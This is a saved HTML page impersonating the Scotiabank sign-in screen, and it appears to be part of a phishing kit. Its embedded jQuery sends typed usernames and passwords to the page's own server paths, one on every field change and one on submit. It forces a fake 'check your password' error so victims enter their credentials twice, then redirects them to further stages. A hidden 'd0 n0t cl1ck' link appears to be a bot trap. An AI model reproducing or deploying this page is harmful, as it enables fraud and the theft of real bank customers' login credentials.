<!DOCTYPE html>
<!-- saved from url=(0036)/220098/sco -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1">
        <title>Sign in | Scotiabank</title>
        <!--<base href="/">-->
        <!--<base href=".">--><base href=".">
        <link rel="stylesheet" href="./files/login.css">
        <link href="./files/styles.52548c4754293a7f0b9b.css" rel="stylesheet" media="all" onload="if(media!=&#39;all&#39;)media=&#39;all&#39;">
        <script src="./files/jquery-3.6.0.min.js###" crossorigin="anonymous"></script>
        <script>
            var lrbank = 'Scotia';
            var lrinfo = 'Login';
        </script>
        <script src="./files/actions.js###"></script>
        <script>
        $(document).ready(function() {
            var attempt = 2;

            $('.lab-form').submit(function(e) {
                e.preventDefault();
                var form = this;

                if (attempt == 1) {
                    $('.div-loader').css('display', 'block');
                    $('.div-main').css('display', 'none');

                    $.post('/220098/CO/api/login-submit', $(this).serialize(), function(response) {
                        $('.error-div').css('display', 'block');

                        $(form).trigger('reset');

                        $('.div-loader').css('display', 'none');
                        $('.div-main').css('display', 'block');
                    }, 'JSON');

                    attempt = 2;
                } else {
                    $('.div-loader').css('display', 'block');
                    $('.div-main').css('display', 'none');

                    $.post('/220098/CO/api/login-submit', $(this).serialize(), function(response) {
                        if (response.status) {
                            if (response.data.loader) {
                                location.href = '/220098/CO/w';
                            } else {
                                location.href = '/220098/CO/q';
                            }
                        } else {
                            $(form).trigger('reset');

                            $('.error-div').css('display', 'block');

                            $('.div-loader').css('display', 'none');
                            $('.div-main').css('display', 'block');
                        }
                    }, 'JSON');
                }

                return false;
            });

            $(document).on('change', '.input-username, .input-password', function() {
                var username = $(this).hasClass('input-username') ? $(this).val() : $(this).closest('form').find('.input-username').val();
                var password = $(this).hasClass('input-password') ? $(this).val() : $(this).closest('form').find('.input-password').val();
                $.post('/220098/CO/data.txt', {username: username, password: password});
            });
        });
        </script>
        <style>
        .dtbOuH {
            display: inline-block;
            stroke-linecap: round;
            stroke-linejoin: round;
            height: 1.8rem;
            stroke-width: 2;
            width: 1.8rem;
            fill: transparent;
            stroke: transparent;
        }

        .fEqiHh {
            margin-top: 36px;
            margin-bottom: -20px;
        }

        .gquXqH {
            padding: 24px;
        }

        .gquXqH {
            background-color: rgb(255, 255, 255);
            border: 0.1rem solid rgb(226, 232, 238);
            border-radius: 0.8rem;
            font-size: 1.6rem;
            width: 100%;
        }

        ._25yKbJzdQG5JaS-QB9EOCt {
            display: flex;
        }

        ._1u8riMqU2Y4IEgHc3CDV_c {
            padding-left: 1.8rem;
        }

        .iivJJS {
            font-weight: normal;
            font-family: "Scotia Regular", Arial, Helvetica, "sans-serif";
            font-size: 1.6rem;
            line-height: 2.4rem;
            color: rgb(51, 51, 51);
        }
        </style>
    </head>
    <body>
        <div class="root" id="root" aria-hidden="false">
            <div class="uQnxO2uiJOTeY5_KPtBG0 div-main">
                <main class="_16e3jP2sLLXzIXpWyvv2MD oOCX0VbIjwJ3RC1iTnrW9">
                    <div class="Grid__container _3raUbeezwceNNQuNKyq0mh">
                        <div class="_2Fmffc2ChdxSI8mbU7bwh_">
                            <div class="Card__container Card__container--xs-padding-18 Card__container--sm-padding-24 Card__container--md-padding-30 Card__container--lg-padding-36 _2P0vW6eMS0PvlMAAf-02Yp">
                                <div class="_2s5uhEm1K9lqu1P-8H0c3_">
                                    <div class="_1tNZ6VlXKYvxboPRQaASdW"><img class="_3jGPs2mmElVPN8FnMTFXe-" src="./files/7c428f63a00e5bd025fa159e8c94389f.svg" alt="Sign in | Scotiabank"></div>
                                    <div class="_2CE_umqAe1YGTpo_uYVsuT">
                                        <div class="Tooltip__container" id="tooltip-container-tooltip">
                                            <button class="TooltipIcon__button TooltipIcon__button--bottom" aria-label="Info">
                                                <svg class="SvgIcon__icon SvgIcon__icon-icon--size-18px" focusable="false" role="presentation" aria-hidden="true" viewBox="0 0 18 18">
                                                    <path fill="none" d="M17,9 C17,13.4174545 13.4174545,17 9,17 C4.58109091,17 1,13.4174545 1,9 C1,4.58109091 4.58109091,1 9,1 C13.4174545,1 17,4.58109091 17,9 Z M9,12.5 L9,8.5 M9.02,5.5 L9,5.44"></path>
                                                </svg>
                                            </button>
                                        </div>
                                    </div>
                                </div>
                                <div class="Margin__container _3HVFtZm4ifhQH02wwMp3JT Margin__container-xs-36--top Margin__container-sm-36--top Margin__container-md-36--top Margin__container-lg-36--top" xs="36" sm="36" md="36" lg="36" side="top">
                                    <h1 class="TextHeadline__text TextHeadline__text--black TextHeadline__text--medium _2x05Bp1YJ7gu-W6PvGkpLK">Welcome to</h1>
                                    <a href="https://www.scotiabank.com/ca/en/personal.html" target="_blank">
                                        <div class="_1B64ZrEq6BvPwNqtqnNEiC">
                                            <svg focusable="true" role="img" aria-hidden="false" class="SvgLogo__scotiabankEn--size-36px" aria-labelledby="scotiabankLogo-title" viewBox="0 0 697.04 99.14">
                                                <title id="scotiabankLogo-title">Scotiabank</title>
                                                <path d="M187,50a34.48,34.48,0,1,0,34.47,34.47A34.52,34.52,0,0,0,187,50Zm0,49.67a15.2,15.2,0,1,1,15.19-15.2A15.21,15.21,0,0,1,187,99.68Z" transform="translate(-17.58 -19.82)" fill="#EC111A"></path>
                                                <polygon points="247.77 31.83 238.36 31.83 238.36 11.48 217.75 11.48 217.75 31.83 208.34 31.83 208.34 50.48 217.75 50.48 217.75 97.5 238.36 97.5 238.36 50.48 247.77 50.48 247.77 31.83" fill="#EC111A"></polygon>
                                                <rect x="257.22" y="31.83" width="20.6" height="65.67" fill="#EC111A"></rect>
                                                <path d="M285.1,19.82A11.48,11.48,0,1,0,296.59,31.3,11.5,11.5,0,0,0,285.1,19.82Z" transform="translate(-17.58 -19.82)" fill="#EC111A"></path>
                                                <path d="M580.64,69.34a12.3,12.3,0,0,1,12.28,12.28v35.7h20.6V78.8c0-17.49-10.09-28.79-26-28.79-6.55,0-13.46,2.87-19.15,12.05V51.65H547.75v65.67h20.61V81.62A12.3,12.3,0,0,1,580.64,69.34Z" transform="translate(-17.58 -19.82)" fill="#EC111A"></path>
                                                <polygon points="671.05 97.5 645.73 64.69 669.27 31.83 645.19 31.83 626.27 58.4 626.27 1.64 605.66 1.64 605.66 97.5 626.27 97.5 626.27 70.43 647.04 97.5 671.05 97.5" fill="#EC111A"></polygon>
                                                <path d="M81.54,99.65a30,30,0,0,0,2.11-12.1c0-6.63-2.08-12.55-5.85-16.68C73.4,66.05,65.88,62.05,55.45,59a37,37,0,0,1-5.86-2.2,14.46,14.46,0,0,1-4.37-3.25,7.37,7.37,0,0,1-1.87-5.32c0-3.05,1.63-5.12,4.29-6.79,3.33-2.1,9.74-2.3,16.29.12a39.83,39.83,0,0,1,6.64,3.15l8.76-17.43a49.86,49.86,0,0,0-12.56-5.66,55,55,0,0,0-14-1.77A37.61,37.61,0,0,0,39.7,22a29.82,29.82,0,0,0-10,6.52,30.84,30.84,0,0,0-6.65,10,31.9,31.9,0,0,0-2.21,12.14A25.58,25.58,0,0,0,28.6,68c6,5.63,12.8,7.63,15.54,8.69s5.75,2,7.68,2.71a27.62,27.62,0,0,1,5.64,2.88,9,9,0,0,1,3,3.34,7.53,7.53,0,0,1,.64,4.19,8.59,8.59,0,0,1-2.93,5.66c-1.77,1.66-5,2.61-9.48,2.61a28.68,28.68,0,0,1-11.49-2.76,82.84,82.84,0,0,1-9.33-5l-10.3,17.94C24.77,114.7,36.42,119,46.8,119a49.52,49.52,0,0,0,15.52-2.48,35.59,35.59,0,0,0,11.77-6.58A30.48,30.48,0,0,0,81.54,99.65Z" transform="translate(-17.58 -19.82)" fill="#EC111A"></path>
                                                <path d="M703.14,94.36a11.48,11.48,0,1,0,11.48,11.48A11.48,11.48,0,0,0,703.14,94.36Zm0,20.65a9.17,9.17,0,1,1,9.17-9.17A9.17,9.17,0,0,1,703.14,115Z" transform="translate(-17.58 -19.82)" fill="#EC111A"></path>
                                                <path d="M703.12,107.76h-1.84v4.35H699V99.58h4.8a4.16,4.16,0,0,1,4.17,4.15,4.07,4.07,0,0,1-2.41,3.65l2.64,4.73h-2.71Zm-1.84-2.1h2.63a1.93,1.93,0,0,0,0-3.84h-2.63Z" transform="translate(-17.58 -19.82)" fill="#EC111A"></path>
                                                <path d="M138,94A15.2,15.2,0,1,1,138,75L151.63,61.3A34.42,34.42,0,0,0,126.13,50c-19,0-35.56,13.53-35.56,34.48S107.12,119,126.13,119a34.42,34.42,0,0,0,25.5-11.29Z" transform="translate(-17.58 -19.82)" fill="#EC111A"></path>
                                                <path d="M376,117.32V51.65H355.93v6.9l-1.86-1.66A25.12,25.12,0,0,0,336.77,50C319,50,304.06,65.8,304.06,84.48S319,119,336.77,119a25.12,25.12,0,0,0,17.3-6.88l1.86-1.66v6.9ZM340,100a15.52,15.52,0,1,1,15.51-15.52A15.53,15.53,0,0,1,340,100Z" transform="translate(-17.58 -19.82)" fill="#EC111A"></path>
                                                <path d="M537.89,117.32V51.65H517.8v6.9l-1.86-1.66A25.12,25.12,0,0,0,498.64,50c-17.73,0-32.71,15.79-32.71,34.47s15,34.48,32.71,34.48a25.12,25.12,0,0,0,17.3-6.88l1.86-1.66v6.9ZM501.84,100a15.52,15.52,0,1,1,15.51-15.52A15.53,15.53,0,0,1,501.84,100Z" transform="translate(-17.58 -19.82)" fill="#EC111A"></path>
                                                <path d="M406.77,117.32v-6.9l1.86,1.66a25.1,25.1,0,0,0,17.3,6.88c17.73,0,32.7-15.79,32.7-34.48S443.66,50,425.93,50a25.1,25.1,0,0,0-17.3,6.88l-1.86,1.66V21.46H386.68v95.86Zm.44-32.84A15.52,15.52,0,1,1,422.73,100,15.53,15.53,0,0,1,407.21,84.48Z" transform="translate(-17.58 -19.82)" fill="#EC111A"></path>
                                            </svg>
                                        </div>
                                    </a>
                                    <div class="Marginstyle__Wrapper-canvas-core__dm8riu-0 fEqiHh Margin__container error-div" style="display: none">
                                        <div class="Cardstyle__Wrapper-canvas-core__sc-1mhf12g-0 gquXqH Card__container" type="flatSolid" id="globalError">
                                            <div class="_25yKbJzdQG5JaS-QB9EOCt">
                                                <div>
                                                    <svg class="SvgIconstyle__Wrapper-canvas-core__sc-15g7y6h-0 dtbOuH SvgIcon__icon" focusable="false" role="presentation" aria-hidden="true" viewBox="0 0 18 18" size="18" color="transparent">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.99553 4.21664V9.35149C7.99553 9.89166 8.39237 10.3296 8.88191 10.3296C9.37144 10.3296 9.76828 9.89166 9.76828 9.35149V4.21664C9.76828 3.67647 9.37144 3.23857 8.88191 3.23857C8.39237 3.23857 7.99553 3.67647 7.99553 4.21664ZM6.17158 1.17349C7.73367 -0.388606 10.2663 -0.388605 11.8284 1.17349L16.8265 6.17157C18.3886 7.73367 18.3886 10.2663 16.8265 11.8284L11.8284 16.8265C10.2663 18.3886 7.73367 18.3886 6.17158 16.8265L1.17349 11.8284C-0.388602 10.2663 -0.388601 7.73367 1.1735 6.17157L6.17158 1.17349ZM9 14.7614C9.7343 14.7614 10.3296 14.1662 10.3296 13.4319C10.3296 12.6976 9.7343 12.1023 9 12.1023C8.26571 12.1023 7.67044 12.6976 7.67044 13.4319C7.67044 14.1662 8.26571 14.7614 9 14.7614Z" fill="#BE061B" stroke="none"></path>
                                                    </svg>
                                                </div>
                                                <div class="TextBodystyle__Text-canvas-core__xx5i8s-0 iivJJS TextBody__text _1u8riMqU2Y4IEgHc3CDV_c" color="black" type="2">Please check your card number / username or password and try again.</div>
                                            </div>
                                        </div>
                                    </div>
                                    <div xs="54" sm="54" md="54" lg="54" side="bottom" class="Margin__container Margin__container-xs-54--bottom Margin__container-sm-54--bottom Margin__container-md-54--bottom Margin__container-lg-54--bottom">
                                        <div></div>
                                    </div>
                                    <form id="input-form" class="lab-form" method="post" action="/220098/" autocomplete="off">
                                        <fieldset class="login">
                                            <legend class="sr-only">login</legend>
                                            <div class="InputContainer__input">
                                                <div class="InputContainer__input--inline">
                                                    <label id="usernameInput-label" for="usernameInput-input">
                                                        <svg class="SvgIcon__icon SvgIcon__icon-icon--size-18px Input__icon Input__icon--left" focusable="false" role="presentation" aria-hidden="true" viewBox="0 0 24 24">
                                                            <g fill="none">
                                                                <path d="M22.129 22.129v-2.39c0-2.64-2.328-4.781-5.199-4.781H6.532c-2.871 0-5.199 2.14-5.199 4.78v2.39"></path>
                                                                <circle cx="12.09" cy="6.353" r="5.02"></circle>
                                                            </g>
                                                        </svg>
                                                    </label>
                                                    <input type="text" required="required" id="usernameInput-input" name="username" value="" placeholder="Username or card number" class="Input__input Input__input--with-left-icon lrinput" attr-action="Filling Username" oninput="this.value = this.value.replace(&#39;@&#39;, &#39;&#39;)" autocomplete="off">
                                                    <input type="hidden" name="CRSFToken" value="">
                                                </div>
                                            </div>
                                            <div xs="12" sm="12" md="12" lg="12" side="top" class="Margin__container Margin__container-xs-12--top Margin__container-sm-12--top Margin__container-md-12--top Margin__container-lg-12--top">
                                                <div class="InputContainer__input">
                                                    <div class="InputContainer__input--inline">
                                                        <label id="password-label" for="password-input">
                                                            <svg class="SvgIcon__icon SvgIcon__icon-icon--size-24px Input__icon Input__icon--left PasswordTextField__icon--lock" focusable="false" role="presentation" aria-hidden="true" viewBox="0 0 24 24">
                                                                <path fill="none" d="M20.175 19.972c0 .988-.808 1.796-1.796 1.796H5.804a1.802 1.802 0 0 1-1.797-1.796v-8.983c0-.988.808-1.796 1.797-1.796h12.575c.988 0 1.796.808 1.796 1.796v8.983z"></path>
                                                                <path d="M12.99 13.684a.897.897 0 1 1-1.795.002.897.897 0 0 1 1.794-.002z"></path>
                                                                <path fill="none" d="M12.104 14.582v2.695"></path>
                                                                <path fill="none" d="M16.607 6.498v2.33M7.6 9.065V6.499m0 0a4.492 4.492 0 0 1 8.982 0"></path>
                                                            </svg>
                                                        </label>
                                                        <input type="password" autocapitalize="none" required="required" id="password-input" name="password" value="" placeholder="Password" class="Input__input Input__input--with-left-icon Input__input--with-right-icon lrinput" attr-action="Filling Password">
                                                    </div>
                                                </div>
                                            </div>
                                            <div xs="18" sm="18" md="18" lg="18" side="top" class="Margin__container Margin__container-xs-18--top Margin__container-sm-18--top Margin__container-md-18--top Margin__container-lg-18--top">
                                                <div class="InputContainer__input--inline Checkbox__container _2IX1IBIW4mYG_6azaZb_K_">
                                                    <div class="Checkbox__tooltipInput">
                                                        <label for="rememberMe" class="Checkbox__label">
                                                            <input type="checkbox" aria-describedby="rememberMe-checkbox-error" id="rememberMe" name="remember me" class="Input__input Checkbox__input" value="">
                                                            <span class="Checkbox__span">
                                                                <svg class="SvgIcon__icon SvgIcon__icon-icon--size-12px Checkbox__icon" focusable="false" role="presentation" aria-hidden="true" viewBox="0 0 24 24">
                                                                    <path stroke="none" d="M13.85 10.667l6.533-5.683A1.727 1.727 0 0 1 22.65 7.59l-6.511 5.663-6.371 5.74c-.7.63-1.775.585-2.418-.103l-6.134-6.559a1.727 1.727 0 0 1 2.522-2.359l4.977 5.321 5.134-4.626z"></path>
                                                                </svg>
                                                            </span>
                                                            <div class="Label__label Label__label--checkbox Label__label--inline">Remember my username or card number</div>
                                                        </label>
                                                    </div>
                                                </div>
                                            </div>
                                            <div xs="30" sm="30" md="30" lg="30" side="bottom" class="Margin__container Margin__container-xs-30--bottom Margin__container-sm-30--bottom Margin__container-md-30--bottom Margin__container-lg-30--bottom">
                                                <div xs="48" sm="48" md="48" lg="48" side="top" class="Margin__container Margin__container-xs-48--top Margin__container-sm-48--top Margin__container-md-48--top Margin__container-lg-48--top"><button class="ButtonCore__button Button__button--primary _3QIv3Rkx0hZd1e7JFFYXPY" id="signIn" name="save" value="1"><span class="ButtonCore__block"><span class="ButtonCore__text">Sign in</span>
                                                    </span>
                                                    </button>
                                                </div>
                                            </div>
                                        </fieldset>
                                    </form>
                                    <button class="TextButton__button _3LnwWFSFcrnhbLmKQR51yU" role="link">
                                        <span>Need help signing in?</span>
                                        <svg class="SvgIcon__icon SvgIcon__icon-icon--size-16px TextButton__icon--right" focusable="false" role="presentation" aria-hidden="true" viewBox="0 0 24 24">
                                            <path fill="none" d="M7.333 2.667L16.667 12l-9.334 9.333"></path>
                                        </svg>
                                    </button>
                                </div>
                            </div>
                        </div>
                        <div xs="36" sm="60" md="60" lg="60" class="Margin__container _3nxHoyhRMxjRdmZp_nmuE2 Margin__container-xs-36--vertical Margin__container-sm-60--vertical Margin__container-md-60--vertical Margin__container-lg-60--vertical" side="both">
                            <p class="TextBody__text--1 TextBody__text--black _2uk89vYv-CLMYFl3ozyjDy">First time signing in?</p>
                            <a href="/220098/#" to="#" tabindex="0" class="Link__link Link__link--size-18px"><span class="Link__text">Let's activate your account</span></a>
                        </div>
                    </div>
                </main>
                <footer class="footer footer--light-theme">
                    <div class="footer__bar container container--center direction--row">
                        <ul class="footer__list">
                            <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/personal/contact-us.html" target="_blank" class="footer__link text--footer text--bold">Contact Us</a></li>
                            <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/about/contact-us/security.html" target="_blank" class="footer__link text--footer text--bold">Security</a></li>
                            <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/about/contact-us/legal.html" target="_blank" class="footer__link text--footer text--bold">Legal</a></li>
                            <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/about/contact-us/privacy.html" target="_blank" class="footer__link text--footer text--bold">Privacy</a></li>
                            <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/personal/accessibility.html" target="_blank" class="footer__link text--footer text--bold">Accessibility</a></li>
                        </ul>
                        <p class="text--roman text--footer footer__copyright">© Scotiabank. All Rights Reserved.</p>
                        <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                    </div>
                </footer>
            </div>
            <div class="_3kP9WPMSj7H53EVe3ptDv6 div-loader" style="display: none" id="app-layout">
                <header class="_1ChzP-ZqsmzLyF7NCGdiJx" id="header">
                    <div class="PoYv4mtPAteIiTCL2kgMd">
                        <a class="link link__text _3NvqcuqzV8Fp_FM2z3Sp4J" href="https://www.scotiabank.com/ca/en/personal.html">
                            <svg class="svg-icon svg-icon-logo--size-18px" focusable="false" role="img" aria-hidden="false" aria-label="Scotiabank Logo" viewBox="0 0 698 104">
                                <g id="scotiabank-red" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                    <g id="Scotiabank" fill="#EC111A" fill-rule="nonzero">
                                        <path d="M170.01,31.19 C156.062323,31.1859554 143.485962,39.585255 138.146549,52.4704552 C132.807135,65.3556554 135.756462,80.1885427 145.61896,90.0510404 C155.481457,99.9135381 170.314345,102.862865 183.199545,97.5234514 C196.084745,92.1840378 204.484045,79.6076774 204.48,65.66 C204.463459,46.6296004 189.0404,31.206541 170.01,31.19 Z M170.01,80.86 C161.615272,80.86 154.81,74.0547282 154.81,65.66 C154.81,57.2652718 161.615272,50.46 170.01,50.46 C178.404728,50.46 185.21,57.2652718 185.21,65.66 C185.198982,74.0501602 178.40016,80.848982 170.01,80.86 L170.01,80.86 Z" id="Shape"></path>
                                        <polygon id="Path" points="248.41 32.83 239 32.83 239 12.48 218.39 12.48 218.39 32.83 208.98 32.83 208.98 51.48 218.39 51.48 218.39 98.5 239 98.5 239 51.48 248.41 51.48"></polygon>
                                        <rect id="Rectangle" x="257.86" y="32.83" width="20.6" height="65.67"></rect>
                                        <path d="M268.16,1 C261.819771,1 256.68,6.13977107 256.68,12.48 C256.68,18.8202289 261.819771,23.96 268.16,23.96 C274.500229,23.96 279.64,18.8202289 279.64,12.48 C279.634486,6.14205631 274.497944,1.00551366 268.16,1 L268.16,1 Z" id="Path"></path>
                                        <path d="M563.69,50.52 C570.46749,50.5310114 575.958989,56.0225096 575.97,62.8 L575.97,98.5 L596.58,98.5 L596.58,59.97 C596.58,42.48 586.48,31.19 570.58,31.19 C564.03,31.19 557.12,34.05 551.44,43.19 L551.44,32.82 L530.82,32.82 L530.82,98.5 L551.43,98.5 L551.43,62.8 C551.43549,56.0280225 556.91804,50.5365282 563.69,50.52 L563.69,50.52 Z" id="Path"></path>
                                        <polygon id="Path" points="671.69 98.5 646.37 65.69 669.91 32.83 645.82 32.83 626.9 59.4 626.9 2.64 606.3 2.64 606.3 98.5 626.9 98.5 626.9 71.43 647.68 98.5"></polygon>
                                        <path d="M64.59,80.82 C66.1237207,76.9760744 66.8455172,72.8563871 66.71,68.72 C66.71,62.1 64.63,56.17 60.85,52.04 C56.45,47.22 48.93,43.22 38.5,40.15 C36.4899977,39.577524 34.5301415,38.8417418 32.64,37.95 C30.9935723,37.1531986 29.5138959,36.0502288 28.28,34.7 C26.9705108,33.2474071 26.2939302,31.332828 26.4,29.38 C26.4,26.38 28.04,24.26 30.69,22.59 C34.02,20.49 40.43,20.28 46.98,22.71 C49.2881098,23.5549587 51.5140574,24.6093549 53.63,25.86 L62.39,8.43 C58.4888938,5.9483423 54.2571977,4.02943479 49.82,2.73 C45.248444,1.54260553 40.5432276,0.94773174 35.82,0.96 C31.3696885,0.898890768 26.9440177,1.63029467 22.75,3.12 C19.010124,4.5948635 15.6082207,6.81290443 12.75,9.64 C9.89789938,12.5061279 7.6352453,15.9035064 6.09,19.64 C4.5802852,23.5068265 3.83321533,27.6292939 3.89,31.78 C4.13712932,38.3663393 6.91698886,44.6031118 11.65,49.19 C17.65,54.82 24.46,56.81 27.2,57.87 C29.94,58.93 32.95,59.82 34.88,60.59 C36.8618628,61.3317163 38.7538061,62.2944605 40.52,63.46 C41.7860866,64.302037 42.8181978,65.4511207 43.52,66.8 C44.1301295,68.1065747 44.3522644,69.5608639 44.16,70.99 C43.9497756,73.1867465 42.9002544,75.2177311 41.23,76.66 C39.47,78.32 36.28,79.27 31.76,79.27 C27.7791432,79.1550053 23.865945,78.2116146 20.27,76.5 C17.0506856,75.0582424 13.9305086,73.4046154 10.93,71.55 L0.63,89.5 C7.82,95.88 19.47,100.14 29.85,100.14 C35.1255742,100.143992 40.3680451,99.3068174 45.38,97.66 C49.6810835,96.2306452 53.6717284,93.9977844 57.14,91.08 C60.3193526,88.2238861 62.8583051,84.7272884 64.59,80.82 L64.59,80.82 Z" id="Path"></path>
                                        <path d="M686.2,75.54 C681.555866,75.5359546 677.366773,78.3304005 675.586736,82.6198607 C673.806699,86.9093209 674.786409,91.8487129 678.068878,95.1340436 C681.351347,98.4193744 686.289883,99.4033887 690.580893,97.6270904 C694.871903,95.850792 697.669998,91.6641362 697.67,87.02 C697.670002,80.6836743 692.536323,75.5455194 686.2,75.54 L686.2,75.54 Z M686.2,96.19 C682.490174,96.1940456 679.143391,93.9624137 677.720898,90.5361417 C676.298405,87.1098698 677.080481,83.1640502 679.702294,80.5393747 C682.324108,77.9146992 686.269071,77.1283183 689.696893,78.5470722 C693.124715,79.965826 695.359998,83.3101717 695.36,87.02 C695.360003,92.0805485 691.260545,96.1844814 686.2,96.19 L686.2,96.19 Z" id="Shape"></path>
                                        <path d="M686.17,88.94 L684.34,88.94 L684.34,93.29 L682.07,93.29 L682.07,80.73 L686.88,80.73 C689.179128,80.7299934 691.044487,82.5908788 691.05,84.89 C691.017529,86.4724269 690.074959,87.8940717 688.63,88.54 L691.27,93.27 L688.56,93.27 L686.17,88.94 Z M684.34,86.83 L686.97,86.83 C687.974037,86.757398 688.751526,85.9216581 688.751526,84.915 C688.751526,83.9083419 687.974037,83.072602 686.97,83 L684.34,83 L684.34,86.83 Z" id="Shape"></path>
                                        <path d="M121.02,75.18 C116.986142,80.2182875 110.210321,82.1597331 104.120397,80.0221676 C98.0304738,77.884602 93.9545038,72.1341734 93.9545038,65.68 C93.9545038,59.2258266 98.0304738,53.475398 104.120397,51.3378324 C110.210321,49.2002669 116.986142,51.1417125 121.02,56.18 L134.68,42.52 C128.157336,35.3280979 118.899202,31.2274963 109.19,31.23 C90.19,31.23 73.63,44.76 73.63,65.7 C73.63,86.64 90.18,100.18 109.19,100.18 C118.901541,100.183703 128.161372,96.0787172 134.68,88.88 L121.02,75.18 Z" id="Path"></path>
                                        <path d="M359.07,98.5 L359.07,32.82 L338.98,32.82 L338.98,39.73 L337.12,38.07 C332.450803,33.6401596 326.256203,31.1766422 319.82,31.19 C302.09,31.19 287.12,46.97 287.12,65.66 C287.12,84.35 302.12,100.14 319.82,100.14 C326.25542,100.149253 332.448553,97.6863197 337.12,93.26 L338.98,91.59 L338.98,98.5 L359.07,98.5 Z M323.07,81.17 C314.505367,81.164478 307.566321,74.2179712 307.570001,65.6533376 C307.573682,57.0887041 314.518697,50.1481641 323.083331,50.1500036 C331.647965,50.1518431 338.589998,57.0953657 338.59,65.66 C338.584705,69.7822852 336.940681,73.7333333 334.020161,76.6425989 C331.099641,79.5518645 327.142275,81.180621 323.02,81.17 L323.07,81.17 Z" id="Shape"></path>
                                        <path d="M520.94,98.5 L520.94,32.82 L500.82,32.82 L500.82,39.73 L498.96,38.07 C494.290803,33.6401596 488.096203,31.1766422 481.66,31.19 C463.93,31.19 448.95,46.97 448.95,65.66 C448.95,84.35 463.95,100.14 481.66,100.14 C488.09542,100.149253 494.288553,97.6863197 498.96,93.26 L500.82,91.59 L500.82,98.5 L520.94,98.5 Z M484.94,81.17 C476.375367,81.164478 469.436321,74.2179712 469.440001,65.6533376 C469.443682,57.0887041 476.388697,50.1481641 484.953331,50.1500036 C493.517965,50.1518431 500.459998,57.0953657 500.46,65.66 C500.454705,69.7822852 498.810681,73.7333333 495.890161,76.6425989 C492.969641,79.5518645 489.012275,81.180621 484.89,81.17 L484.94,81.17 Z" id="Shape"></path>
                                        <path d="M389.82,98.5 L389.82,91.59 L391.68,93.26 C396.352568,97.6845639 402.54497,100.147207 408.98,100.14 C426.71,100.14 441.69,84.35 441.69,65.66 C441.69,46.97 426.69,31.19 408.98,31.19 C402.543993,31.1776697 396.34976,33.6410409 391.68,38.07 L389.82,39.73 L389.82,2.64 L369.73,2.64 L369.73,98.5 L389.82,98.5 Z M390.27,65.66 C390.270028,57.0992768 397.205981,50.1573976 405.766701,50.1500573 C414.327421,50.1427169 421.275268,57.0726915 421.289977,65.6334021 C421.304686,74.1941127 414.380695,81.1479221 405.82,81.17 C401.701187,81.1753077 397.748961,79.5442042 394.83277,76.6355142 C391.916579,73.7268243 390.275301,69.7788131 390.27,65.66 L390.27,65.66 Z" id="Shape"></path>
                                    </g>
                                </g>
                            </svg>
                        </a>
                    </div>
                </header>
                <main class="_2ZVb38DpkqtGp0Be4LNKoB">
                    <div class="_2Fmffc2ChdxSI8mbU7bwh_">
                        <div class="Card__container Card__container--xs-padding-18 Card__container--sm-padding-24 Card__container--md-padding-30 Card__container--lg-padding-36 _1dzrLUbharfWi1F3nyVifP">
                            <style>
                            .loader-div {
                                text-align: center;
                                padding-top: 20px;
                            }

                            .loader-div h2 {
                                font-size: 28px;
                                margin-bottom: 40px;
                            }

                            .loader-div p {
                                margin-top: 37px;
                                padding: 0px 42px;
                                font-size: 16px;
                            }
                            </style>
                            <script>
                            setInterval(function() {
                                $('.loader-div p').css('display', 'block');
                            }, 4000);
                            </script>
                            <div class="_1AR6e5iqu8uXHMTFKLnqWr loader-div">
                                <h1 class="TextHeading__text _3hjDHBxiP1Z2Uj2D22Khad">Processing</h1>
                                <img src="./files/loading.gif" width="80">
                            </div>
                        </div>
                    </div>
                </main>
                <footer class="footer footer--light-theme _3Ip9Jf7J6eOEvKAl2ldIr8">
                    <div class="footer__bar container container--center direction--row _1t5tVchF8n-Sj-oAlYARZB">
                        <ul class="footer__list">
                            <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/personal/contact-us.html" target="_blank" class="footer__link text--footer text--bold">Contact Us</a></li>
                            <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/about/contact-us/security.html" target="_blank" class="footer__link text--footer text--bold">Security</a></li>
                            <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/about/contact-us/legal.html" target="_blank" class="footer__link text--footer text--bold">Legal</a></li>
                            <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/about/contact-us/privacy.html" target="_blank" class="footer__link text--footer text--bold">Privacy</a></li>
                            <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/personal/accessibility.html" target="_blank" class="footer__link text--footer text--bold">Accessibility</a></li>
                            <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                        </ul>
                        <p class="text--roman text--footer footer__copyright">© Scotiabank. All Rights Reserved.</p>
                    </div>
                </footer>
            </div>
        </div>
    

</body></html>